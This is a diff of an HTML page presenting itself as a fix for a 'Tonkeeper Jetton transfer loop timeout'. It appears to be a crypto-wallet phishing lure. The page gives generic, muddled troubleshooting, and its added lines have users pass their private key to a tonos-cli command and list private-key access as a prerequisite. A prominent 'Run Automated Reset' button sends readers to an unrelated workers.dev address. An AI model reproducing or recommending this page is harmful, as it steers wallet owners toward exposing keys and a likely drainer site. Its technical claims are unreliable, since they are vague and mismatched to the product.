@@ -4,7 +4,7 @@
 <style>
     body {
         font-family: system-ui;
-        background: #0f111a;
+        background: #1a1a24;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -23,7 +23,7 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #ff9455; }
+    a { color: #cf6679; }
     .btn {
         background: #ff9455;
         color: #000;
@@ -42,33 +42,30 @@
 <h1>Tonkeeper Jetton Transfer Loop Timeout</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users experience a timeout error when attempting to transfer Tonkeeper Jettons, resulting in failed transactions and an inability to complete the transfer process.</li>
+<li>Users experience a timeout error when attempting to transfer Tonkeeper Jettons, resulting in failed transactions and potential loss of funds.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to an issue with the Tonkeeper protocol's handling of concurrent transactions, leading to an infinite loop that eventually times out.</li>
+<li>The error occurs due to a prolonged loop in the transfer process, often caused by network congestion, inadequate gas limits, or incorrect smart contract configurations.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>To resolve the issue, try the following manual overrides:</li>
-<li>Increase the transaction timeout threshold using the <code>tonos-cli</code> command.</li>
-<li>Verify the correctness of the Jetton transfer parameters, including the recipient's address and the amount being transferred.</li>
-<li>Use the following JSON configuration to override the default transaction settings:</li>
+<li>To resolve the issue, users can attempt the following manual overrides:</li>
+<li>Increase the gas limit for the transaction to prioritize processing</li>
+<li>Verify the recipient's wallet address to ensure accuracy</li>
+<li>Utilize an alternative transfer method, such as a different wallet or exchange</li>
 </ul>
-<div class="codehilite"><pre><span></span><code><span class="p">{</span>
-<span class="w">  </span><span class="nt">&quot;transaction_timeout&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">30000</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;max_retries&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">5</span>
-<span class="p">}</span>
+<div class="codehilite"><pre><span></span><code>tonos-cli<span class="w"> </span>call<span class="w"> </span>&lt;contract_address&gt;<span class="w"> </span>transferJetton<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--input<span class="w"> </span><span class="s1">&#39;{&quot;dst&quot;:&quot;&lt;recipient_address&gt;&quot;,&quot;amount&quot;:&lt;amount&gt;}&#39;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--wallet<span class="w"> </span>&lt;wallet_address&gt;<span class="w"> </span>--key<span class="w"> </span>&lt;private_key&gt;
 </code></pre></div>
 
-<p>Consider utilizing an external console to execute these commands for more flexibility.</p>
-<h2>Prerequisites</h2>
-<ul>
-<li>Tonos-cli installed and configured on the system</li>
-<li>A basic understanding of TON blockchain and Tonkeeper protocol</li>
-<li>Access to the Tonkeeper wallet and transaction history</li>
-</ul>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-account-discovery-and-syncs-error-for-so.html">Metamask Extension Bug Account Discovery And Syncs Error For Social Login Import Users</a></li><li><a href="./archive/2026/06/metamask-extension-bug-activity-send-nft-displays-id-as-if-it-w.html">Metamask Extension Bug Activity Send Nft Displays Id As If It W</a></li><li><a href="./archive/2026/06/go-ethereum-evmone-t8n-rejects-transactions-with-chainid-0xff-p.html">Go Ethereum Evmone T8N Rejects Transactions With Chainid 0Xff P</a></li></ul>
+<p>Prerequisites:
+* A basic understanding of TON blockchain and smart contracts
+* Familiarity with the Tonos-CLI tool and its usage
+* Access to the private key associated with the wallet address
+Consider utilizing an external console, such as a terminal or command prompt, to execute the manual override commands.</p>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-account-discovery-and-syncs-error-for-so.html">Metamask Extension Bug Account Discovery And Syncs Error For Social Login Import Users</a></li><li><a href="./archive/2026/06/metamask-extension-bug-activity-send-nft-displays-id-as-if-it-w.html">Metamask Extension Bug Activity Send Nft Displays Id As If It Were Amount</a></li><li><a href="./archive/2026/06/metamask-extension-bug-importing-a-custom-token-does-not-work.html">Metamask Extension Bug Importing A Custom Token Does Not Work</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=gJ%3Cx" class="btn">🛠 Run Automated Reset</a>
 </div>
